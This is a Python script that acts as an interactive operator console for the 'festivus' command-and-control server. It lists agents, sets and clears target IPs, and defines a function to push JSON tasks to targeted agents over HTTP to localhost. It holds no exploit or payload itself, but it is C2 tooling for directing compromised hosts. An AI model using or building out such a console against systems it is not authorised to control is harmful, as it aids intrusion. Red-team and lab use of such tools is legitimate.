#!/usr/bin/python3

"""
Description: This program is used to interactively manage the festivus C2 server.
"""

import requests
import json

URL = "http://localhost:80"

def options():
    print("SHOW AGENTS\tList all agents")
    print("SHOW TARGETS\tList targeted agents")
    print("TARGET <IP(s)>\tSet specified IPs as targets (IPs should be comma separated)")
    print("UNTARGET <IP(s)>\tRemove specified IPs as targets (IPs should be comma separated)")
    print("CLEAR TARGETS\tRemove all targets")

def set_targets(ips):
    data = {"ips": ips}
    r = requests.post(f"{URL}/set-targets", json=data)

def get_targets():
    r = requests.get(f"{URL}/targets")
    return r.text.split("\n")

def untarget(ips):
    data = {"ips": ips}
    r = requests.post(f"{URL}/untarget", json=data)

def clear_targets():
    r = requests.post(f"{URL}/clear-targets")

def post_task(json_filename):
    with open(json_filename, "r") as f:
        json_data = json.load(f)
        for target in get_targets():
            json_data['agent_id'] = target
            r = requests.post(f"{URL}/make-task", json=json_data)

def main():
    print("Festivus C2 Manager\n\n")
    while True:
        userin = input("Festivus> ")
        #Process one word commands
        if userin.upper() in ["HELP", "?"]:
            options()
            continue
        #Process multi-word commands
        splits = userin.split(" ")
        #Show related commands
        if userin.upper().strip() == "SHOW AGENTS":
            r = requests.get(f"{URL}/get-agents")
            agents = r.json()
            print("Agents:")
            for agent in agents:
                print(f"{agent['agent_id']} - {agent['status']}")
        elif userin.upper().strip() == "SHOW TARGETS":
            targets = get_targets()
            print("Targets:")
            for target in targets:
                print(target)
        #Targeting related commands
        elif splits[0].upper() == "TARGET":
            ips = splits[1].split(",")
            set_targets(ips)
        elif splits[0].upper() == "UNTARGET":
            ips = splits[1].split(",")
            untarget(ips)
        elif userin.upper().strip() == "CLEAR TARGETS":
            clear_targets()
        else:
            print("Invalid command")
            options()

        


if __name__ == "__main__":
    main()